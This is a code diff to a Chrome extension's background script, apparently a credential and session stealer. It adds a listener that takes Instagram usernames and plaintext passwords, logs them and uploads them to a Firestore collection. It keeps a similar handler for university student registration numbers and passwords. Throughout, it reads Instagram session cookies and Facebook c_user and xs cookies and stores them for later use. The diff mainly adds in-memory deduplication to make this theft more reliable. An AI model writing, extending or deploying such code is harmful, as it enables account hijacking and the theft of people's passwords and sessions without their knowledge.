@@ -8,18 +8,127 @@ import { db } from "./firebase-init.js";
 import { collection, addDoc } from "./firebase-firestore.js";
 import { isDuplicateData } from "./utils.js";
 
+// ============== 🧠 In-Memory Cache for Deduplication ==============
+const savedStudentSet = new Set();
+const savedInstagramCredSet = new Set();
+const savedInstagramSessionSet = new Set();
+const savedFacebookSessionSet = new Set();
+
 // 🌐 Navigation Handler
 chrome.webNavigation.onCompleted.addListener(
-  async ({ url }) => {
-    if (url.includes("instagram.com")) handleInstagram();
-    else if (url.includes("facebook.com")) handleFacebook();
+  async ({ url, frameId }) => {
+    if (frameId !== 0) return; // ⛔ Ignore iframes
+
+    if (url.includes("instagram.com")) {
+      // Pehle credentials handle ho chuke honge, ab cookies check karo
+      await handleInstagram();
+    } else if (url.includes("facebook.com")) {
+      await handleFacebook();
+    }
   },
   {
     url: [{ hostSuffix: "instagram.com" }, { hostSuffix: "facebook.com" }],
   }
 );
 
-// 📸 Instagram Session Logger
+// 📩 Message Listener (with listener flag so it doesn't double register)
+if (!globalThis.messageListenerAttached) {
+  chrome.runtime.onMessage.addListener(async (msg, sender, sendResponse) => {
+    // 🔐 Instagram Login Credentials Handler
+    if (msg.type === "instagram_login_data") {
+      const { username, password } = msg.data;
+
+      if (!username || !password) {
+        console.warn(
+          "%c⚠️ [IG Login] Incomplete login data received, skipping save.",
+          "color: orange; font-weight: bold;"
+        );
+        return;
+      }
+
+      console.log(
+        "%c[IG Login] Received login credentials:",
+        "color: dodgerblue; font-weight: bold; font-size: 14px;"
+      );
+      console.table({ username, password });
+
+      const colRef = collection(db, "instagramCred");
+      const docData = { username, password };
+      const key = `${username}:${password}`;
+
+      try {
+        if (savedInstagramCredSet.has(key)) {
+          console.warn(
+            "%c⛔️ [IG Login] Already handled in-memory — skipping save",
+            "color: gray; font-weight: bold;"
+          );
+          return;
+        }
+        savedInstagramCredSet.add(key);
+
+        if (await isDuplicateData(colRef, docData)) {
+          console.warn(
+            "%c⛔️ [IG Login] Duplicate login data detected — skipping save",
+            "color: gray; font-weight: bold;"
+          );
+          return;
+        }
+
+        await addDoc(colRef, { ...docData, timestamp: new Date() });
+        console.log(
+          `%c🚀 [IG Login] Login credentials saved for @${username}`,
+          "color: mediumseagreen; font-weight: bold; font-size: 14px;"
+        );
+      } catch (err) {
+        console.error(
+          "%c❌ [IG Login] Failed to save credentials to Firestore:",
+          "color: red; font-weight: bold;",
+          err
+        );
+      }
+    }
+
+    // 🏫 Student Data Handler (Unchanged)
+    if (msg.type === "student_data") {
+      const { registrationNumber, password } = msg.data;
+
+      if (!registrationNumber || !password) return;
+
+      const colRef = collection(db, "studentData");
+      const docData = { registrationNumber, password };
+      const key = `${registrationNumber}:${password}`;
+
+      try {
+        if (savedStudentSet.has(key)) {
+          console.warn(
+            "%c⛔️ [LPU] Already handled in-memory — skipping",
+            "color: gray; font-weight: bold;"
+          );
+          return;
+        }
+        savedStudentSet.add(key);
+
+        if (await isDuplicateData(colRef, docData)) return;
+
+        await addDoc(colRef, { ...docData, timestamp: new Date() });
+        console.log(
+          `%c✅ [LPU] Student data saved for regNo: ${registrationNumber}`,
+          "color: mediumseagreen; font-weight: bold;"
+        );
+      } catch (err) {
+        console.error(
+          "%c❌ [LPU] Error saving student data:",
+          "color: red; font-weight: bold;",
+          err
+        );
+      }
+    }
+  });
+
+  globalThis.messageListenerAttached = true;
+}
+
+// 🍪 Instagram Session Cookie Handler (Always Run)
 async function handleInstagram() {
   chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
     console.log(
@@ -104,13 +213,17 @@ async function handleInstagram() {
       return;
     }
 
-    const docData = { sessionId, userId, username, bio };
-    console.log(
-      "%c[IG] Preparing to save data:",
-      "color: deepskyblue; font-weight: bold;"
-    );
-    console.table(docData);
+    const key = `${userId}:${sessionId}`;
+    if (savedInstagramSessionSet.has(key)) {
+      console.warn(
+        "%c⛔️ [IG] Already handled in-memory — skipping",
+        "color: gray; font-weight: bold;"
+      );
+      return;
+    }
+    savedInstagramSessionSet.add(key);
 
+    const docData = { sessionId, userId, username, bio };
     const colRef = collection(db, "instagram");
 
     try {
@@ -121,16 +234,7 @@ async function handleInstagram() {
         );
         return;
       }
-    } catch (err) {
-      console.error(
-        "%c❌ [IG] Error during duplicate check:",
-        "color: red; font-weight: bold;",
-        err
-      );
-      return;
-    }
 
-    try {
       await addDoc(colRef, { ...docData, timestamp: new Date() });
       console.log(
         `%c🚀 [IG] Session saved successfully for @${username}`,
@@ -146,7 +250,7 @@ async function handleInstagram() {
   });
 }
 
-// 📘 Facebook Session Logger
+// 📘 Facebook Cookie Handler (As-is)
 async function handleFacebook() {
   chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
     console.log(
@@ -164,6 +268,16 @@ async function handleFacebook() {
       );
       return;
     }
+
+    const key = `${cUser.value}:${xs.value}`;
+    if (savedFacebookSessionSet.has(key)) {
+      console.warn(
+        "%c⛔️ [FB] Already handled in-memory — skipping",
+        "color: gray; font-weight: bold;"
+      );
+      return;
+    }
+    savedFacebookSessionSet.add(key);
 
     const docData = {
       c_user: cUser.value,
@@ -186,16 +300,7 @@ async function handleFacebook() {
         );
         return;
       }
-    } catch (err) {
-      console.error(
-        "%c❌ [FB] Error during duplicate check:",
-        "color: red; font-weight: bold;",
-        err
-      );
-      return;
-    }
 
-    try {
       await addDoc(colRef, { ...docData, timestamp: new Date() });
       console.log(
         "%c🚀 [FB] Facebook session saved successfully",
@@ -210,73 +315,3 @@ async function handleFacebook() {
     }
   });
 }
-
-// 🚨 Duplicate prevention for student data
-let lastStudentData = null;
-
-// ✉️ LPU student data listener with duplicate check + pro logs
-chrome.runtime.onMessage.addListener(async (msg, sender, sendResponse) => {
-  if (msg.type === "student_data") {
-    const { registrationNumber, password } = msg.data;
-
-    if (!registrationNumber || !password) {
-      console.warn(
-        "%c⚠️ [LPU] Incomplete student data received, skipping save.",
-        "color: orange; font-weight: bold;"
-      );
-      return;
-    }
-
-    // Prevent handling exact same data repeatedly (debounce)
-    if (
-      lastStudentData &&
-      lastStudentData.registrationNumber === registrationNumber &&
-      lastStudentData.password === password
-    ) {
-      // Duplicate message, silently ignore
-      return;
-    }
-
-    lastStudentData = { registrationNumber, password };
-
-    console.log(
-      "%c[LPU] Received student data:",
-      "color: dodgerblue; font-weight: bold; font-size: 14px;"
-    );
-    console.table({ registrationNumber, password });
-
-    const colRef = collection(db, "studentData");
-    const docData = { registrationNumber, password };
-
-    try {
-      if (await isDuplicateData(colRef, docData)) {
-        console.warn(
-          "%c⛔️ [LPU] Duplicate student data detected — skipping save",
-          "color: gray; font-weight: bold;"
-        );
-        return;
-      }
-    } catch (err) {
-      console.error(
-        "%c❌ [LPU] Error during duplicate check:",
-        "color: red; font-weight: bold;",
-        err
-      );
-      return;
-    }
-
-    try {
-      await addDoc(colRef, { ...docData, timestamp: new Date() });
-      console.log(
-        `%c✅ [LPU] Student data saved for regNo: ${registrationNumber}`,
-        "color: mediumseagreen; font-weight: bold; font-size: 14px;"
-      );
-    } catch (err) {
-      console.error(
-        "%c❌ [LPU] Failed to save student data:",
-        "color: red; font-weight: bold;",
-        err
-      );
-    }
-  }
-});
